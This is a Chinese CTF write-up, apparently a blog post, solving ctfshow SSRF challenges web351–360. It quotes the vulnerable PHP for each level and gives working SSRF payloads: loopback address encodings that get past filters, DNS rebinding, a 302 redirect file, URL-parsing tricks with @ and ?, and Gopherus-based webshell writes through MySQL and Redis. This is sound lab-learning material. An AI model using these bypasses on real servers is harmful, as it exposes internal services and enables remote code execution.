---

## web351

给了一段代码，不知道什么意思就去查看[PHP cURL 函数 | 菜鸟教程](https://www.runoob.com/php/php-ref-curl.html "PHP cURL 函数 | 菜鸟教程")

```
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);//初始化 cURL 会话
curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。
$result=curl_exec($ch);//执行 cURL 会话
curl_close($ch);//关闭 cURL 会话
echo ($result);
?>
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

这代码其实就是没有做任何防护，我们的目的就是 进入内网获取信息

直接post

```
url=http://127.0.0.1/flag.php
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

## web352

```
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

> 记录一下parse_url()的作用
> 
> http://u:p@a.com:80@b.com/
> 
> php解析结果：
> 
> schema: http
> 
> host: b.com
> 
> user: u
> 
> pass: p@a.com:80
> 
> 所以这题只需满足是http或者https就行，根本没影响

稍作过滤， 127.0.0.1的绕过方式太多了，

```
127.0.0.1绕过-进制转换
 
十进制 2130706433
 
八进制 017700000001
 
二进制 0b1111111000000000000000000000001 
十六进制 0x7f000001
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

```
http://localhost/       # localhost就是代指127.0.0.1
http://0/               # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

## web353

```
if(!preg_match('/localhost|127\.0\.|\。/i', $url))
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

同上

## web354

```
if(!preg_match('/localhost|1|0|。/i', $url))
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

0和1都禁用了，想拿http://①②⑦.⓪.⓪.①来绕过，但是没有反应

看大佬修改自己域名的a记录，也去尝试一下

域名解析的记录值修改成127.0.0.1

![](https://img-blog.csdnimg.cn/c9563a2a67c048169f73f810a563185f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVGhuUGtt,size_20,color_FFFFFF,t_70,g_se,x_16)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")​

payload：

```
url=http://自己的域名/flag.php
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

## web355

```
$host=$x['host'];
if((strlen($host)<=5)) //这里的host就是127.0.0.1
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

控制host长度小于5 ，直接127.1 就行

## web356

```
$host=$x['host'];
if((strlen($host)<=3)){
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

3个长度，直接 url=http://0/flag.php

## web357

```
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?>
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

[PHP FILTER_VALIDATE_IP 过滤器 | 菜鸟教程](https://www.runoob.com/php/filter-validate-ip.html "PHP FILTER_VALIDATE_IP 过滤器 | 菜鸟教程")

[PHP filter_var() 函数 | 菜鸟教程](https://www.runoob.com/php/func-filter-var.html "PHP filter_var() 函数 | 菜鸟教程")

看教程用302跳转，就是在自己的服务器上写一个php文件，内容如下

```
<?php 
header("Location: http://127.0.0.1/flag.php");
?>
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

然后访问这个文件

```
url=http://thnpkm.xyz/ssrf.php
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

## web358

```
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

以ctf开头，show结尾，有个操作用@和?

在@前加的内容都不会被解析成host的内容，而#或?后面的的内容也不会被解析到path中

```
url=http://ctf.@127.0.0.1/flag.php?show
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")

![](https://img-blog.csdnimg.cn/aeaedc09b366486cb701f3ad900a26e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVGhuUGtt,size_20,color_FFFFFF,t_70,g_se,x_16)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")​

## web359

打无密码的mysql

完全是跟着wp来尝试，就是通过Gopherus把一句话写进网站根目录，语句要正确

![](https://img-blog.csdnimg.cn/22edac17adb8451e837f526867bcfde8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVGhuUGtt,size_20,color_FFFFFF,t_70,g_se,x_16)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")​

然后复制过去

![](https://img-blog.csdnimg.cn/b2543354746c41aa8e18b117bcf3c143.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVGhuUGtt,size_20,color_FFFFFF,t_70,g_se,x_16)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")​

下划线后面的值再url编码一次，然后执行

这样一句话打进去后就可以在a.php 下rce了

![](https://img-blog.csdnimg.cn/8c9fc09c8ed54e8cbb91284b75df6bd3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVGhuUGtt,size_20,color_FFFFFF,t_70,g_se,x_16)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")​

## web360

打redis

也是看wp学操作， 进入redis

![](https://img-blog.csdnimg.cn/e73c1a2751ee41edb961ee3cba26db1b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVGhuUGtt,size_20,color_FFFFFF,t_70,g_se,x_16)![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw== "点击并拖拽以移动")​

默认是在shell.php执行，操作方式与上题一样，下划线后url编码

自己没弄出来，可能把题目环境搞崩了

​
